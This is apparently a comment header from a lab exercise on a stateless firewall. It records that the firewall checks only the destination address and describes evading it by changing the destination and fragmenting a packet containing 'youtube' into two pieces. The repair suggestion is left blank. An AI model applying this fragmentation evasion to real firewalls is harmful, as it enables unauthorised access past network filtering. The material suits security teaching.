/**
 * Stateless Firewall
 * Identified Vulnerability: only checks against dest 
 * Exploit Method: changed dest address from 192.168.2.1 to 192.168.2.2 to first pass
 *                 into the stateless method, then by splitting the packet into two
 *                 "you" and "tube" and adjusting the other fields to match the length
 *                 more flags, and offset the packet was passed to the server
 * Repair Suggestion:
